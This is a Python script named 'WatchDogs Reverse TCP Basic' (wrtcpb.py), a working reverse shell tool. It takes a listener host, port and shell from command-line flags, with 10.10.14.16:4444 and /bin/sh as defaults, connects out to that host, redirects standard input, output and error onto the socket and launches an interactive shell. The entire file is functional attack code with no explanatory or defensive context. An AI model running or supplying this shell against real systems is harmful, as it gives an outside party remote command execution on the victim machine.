#!/usr/bin/python

# author: WatchDogOblivion
# description: TODO
# WatchDogs Reverse TCP Basic a.k.a wrtcpb

import os
import sys
import socket
import traceback
import subprocess


class WReverseTCPB:

  VERSION = "1.0"

  USAGE = "Usage: python wrtcpb.py -lh 10.10.14.16 -lp 4444 -c /bin/sh"
  FLAGS = ["-lh", "--local-host", "-lp", "--local-port", "-s", "--shell", "-v", "--version", "-h", "--help"]

  def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
    self.localHost = localHost  #type: str
    self.localPort = localPort  #type: int
    self.shell = shell  #type: str

  def checkArgs(self):  #type: (WReverseTCPB) -> None
    FLAGS = WReverseTCPB.FLAGS
    sysArgs = sys.argv
    if (len(sysArgs) == 1):
      return

    if (sysArgs[1] == FLAGS[8] or sysArgs[1] == FLAGS[9]):
      print(WReverseTCPB.USAGE)
      print("Optional arguments:")
      print("  -lh  --local-host     : Specify your local ip address")
      print("  -lp, --local-port     : Specify your local port")
      print("  -s,  --shell          : Specify the command to execute on successful reverse tcp.")
      print("  -v,  --version        : Show version.")
      print("  -h,  --help           : Show this help message")
      exit()

    if (sysArgs[1] == FLAGS[6] or sysArgs[1] == FLAGS[7]):
      print("Reverse TCP version: {}".format(WReverseTCPB.VERSION))
      exit()

  def setArguments(self, flag, arg):  #type: (WReverseTCPB, str, str) -> None
    FLAGS = WReverseTCPB.FLAGS

    if (flag not in FLAGS):
      raise ValueError("Unknown flag " + flag)

    if (flag == FLAGS[0] or flag == FLAGS[1]):
      self.localHost = arg
    elif (flag == FLAGS[2] or flag == FLAGS[3]):
      self.localPort = int(arg)
    elif (flag == FLAGS[4] or flag == FLAGS[5]):
      self.shell = arg

  def iterateArguments(self):  #type: (WReverseTCPB) -> None
    sysArgs = sys.argv
    sysArgsLength = len(sysArgs)
    if (sysArgsLength == 1):
      return
    for index in range(1, sysArgsLength):
      if (index % 2 == 0):
        continue
      self.setArguments(sysArgs[index], sysArgs[index + 1])

  def reverseTCP(self):  #type: (WReverseTCPB) -> None
    localHost = self.localHost
    localPort = self.localPort
    shell = self.shell
    print("Initiating connection: {}:{} {}".format(localHost, localPort, shell))

    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((localHost, localPort))
    os.dup2(_socket.fileno(), 0)
    os.dup2(_socket.fileno(), 1)
    os.dup2(_socket.fileno(), 2)
    subprocess.call([shell, "-i"])


def __main__():  #type: () -> None

  wrtcpb = WReverseTCPB()
  try:
    wrtcpb.checkArgs()
    wrtcpb.iterateArguments()
    wrtcpb.reverseTCP()
  except ValueError as ve:
    print(ve)
    print(WReverseTCPB.USAGE)
  except Exception:
    print(traceback.format_exc())
    print(WReverseTCPB.USAGE)


__main__()
